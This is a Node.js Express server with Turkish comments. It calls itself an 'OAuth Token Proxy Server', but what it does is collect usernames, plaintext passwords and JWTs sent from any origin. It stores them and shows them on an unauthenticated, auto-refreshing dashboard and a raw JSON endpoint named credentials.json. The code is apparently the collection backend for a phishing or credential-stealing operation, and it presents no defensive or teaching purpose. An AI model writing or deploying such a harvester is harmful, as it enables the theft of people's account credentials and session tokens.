const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;
const DATA_FILE = path.join('/tmp', 'login-attempts.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Veri dosyasını oluştur
async function initDataFile() {
  try {
    await fs.access(DATA_FILE);
  } catch {
    await fs.writeFile(DATA_FILE, JSON.stringify([]));
  }
}

// Login denemelerini oku
async function readLoginAttempts() {
  try {
    const data = await fs.readFile(DATA_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return [];
  }
}

// Login denemelerini kaydet
async function saveLoginAttempt(username, password, jwt = null) {
  const attempts = await readLoginAttempts();
  const newAttempt = {
    id: crypto.randomUUID(),
    username,
    password,
    jwt: jwt ? 'TOKEN_SAVED' : null,
    timestamp: new Date().toISOString()
  };
  
  attempts.unshift(newAttempt);
  
  // Son 100 denemeyi tut
  if (attempts.length > 100) {
    attempts.splice(100);
  }
  
  await fs.writeFile(DATA_FILE, JSON.stringify(attempts, null, 2));
  return newAttempt;
}

// Ana sayfa
app.get('/', (req, res) => {
  res.json({ 
    message: 'OAuth Token Proxy Server',
    endpoints: {
      save: '/save - POST username, password, jwt kaydetmek için',
      json: '/json - Kaydedilen verileri görüntüle',
      api: '/api/credentials.json - Ham JSON verisi'
    },
    timestamp: new Date().toISOString()
  });
});

// Kullanıcı adı ve şifre kaydetme endpoint'i
app.post('/save', async (req, res) => {
  const { username, password, jwt } = req.body;
  
  console.log('💾 Veri kaydediliyor:', {
    username: username || 'YOK',
    password: password ? '****' : 'YOK',
    jwt: jwt ? 'TOKEN_VAR' : 'YOK',
    timestamp: new Date().toISOString()
  });
  
  if (!username || !password) {
    return res.status(400).json({ 
      error: 'Username ve password gerekli',
      received: { username: !!username, password: !!password }
    });
  }
  
  try {
    const saved = await saveLoginAttempt(username, password, jwt);
    console.log('✅ Veri başarıyla kaydedildi:', saved.id);
    
    res.json({ 
      success: true, 
      message: 'Veriler kaydedildi',
      id: saved.id,
      timestamp: saved.timestamp
    });
  } catch (error) {
    console.error('❌ Kaydetme hatası:', error);
    res.status(500).json({ error: 'Kaydetme hatası: ' + error.message });
  }
});

// JSON formatında verileri görüntüle (web sayfası)
app.get('/json', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    
    const html = `
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kaydedilen Veriler</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #1a1a1a;
                color: #00ff00;
                margin: 0;
                padding: 20px;
                line-height: 1.6;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.1);
            }
            .json-container {
                background: #000;
                border: 1px solid #333;
                border-radius: 8px;
                padding: 20px;
                overflow-x: auto;
                white-space: pre-wrap;
                font-size: 14px;
            }
            .stats {
                display: flex;
                justify-content: space-around;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            .stat-box {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #00ff00;
                padding: 15px;
                border-radius: 8px;
                text-align: center;
                margin: 5px;
                min-width: 150px;
            }
            .refresh-btn {
                background: #00ff00;
                color: #000;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                margin: 10px;
            }
            .refresh-btn:hover {
                background: #00cc00;
            }
            .copy-btn {
                background: #0066ff;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                cursor: pointer;
                margin-bottom: 10px;
            }
            .copy-btn:hover {
                background: #0052cc;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 KAYDEDİLEN VERİLER</h1>
                <p>Kullanıcı Adı ve Şifre Kayıtları</p>
                <button class="refresh-btn" onclick="window.location.reload()">🔄 Yenile</button>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Toplam Kayıt</h3>
                    <div style="font-size: 24px; font-weight: bold;">${attempts.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Token'lı Kayıt</h3>
                    <div style="font-size: 24px; font-weight: bold; color: #00ff00;">${attempts.filter(a => a.jwt).length}</div>
                </div>
                <div class="stat-box">
                    <h3>Son Güncelleme</h3>
                    <div style="font-size: 14px;">${new Date().toLocaleString('tr-TR')}</div>
                </div>
            </div>
            
            <button class="copy-btn" onclick="copyToClipboard()">📋 JSON'u Kopyala</button>
            
            <div class="json-container" id="jsonData">${JSON.stringify(attempts, null, 2)}</div>
        </div>
        
        <script>
            function copyToClipboard() {
                const jsonData = document.getElementById('jsonData').textContent;
                navigator.clipboard.writeText(jsonData).then(function() {
                    alert('JSON verisi panoya kopyalandı!');
                }, function(err) {
                    console.error('Kopyalama hatası: ', err);
                });
            }
            
            // 30 saniyede bir otomatik yenile
            setTimeout(function() {
                window.location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Ham JSON endpoint
app.get('/api/credentials.json', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    res.setHeader('Content-Type', 'application/json');
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Sunucuyu başlat
async function startServer() {
  await initDataFile();
  
  app.listen(PORT, () => {
    console.log(`🚀 Server çalışıyor: ${PORT}`);
    console.log(`📊 Veriler: http://localhost:${PORT}/json`);
    console.log(`💾 Kaydetme: POST http://localhost:${PORT}/save`);
    console.log('');
    console.log('📝 Kullanım:');
    console.log('POST /save ile username, password, jwt gönder');
    console.log('GET /json ile kaydedilen verileri gör');
  });
}

startServer().catch(console.error);
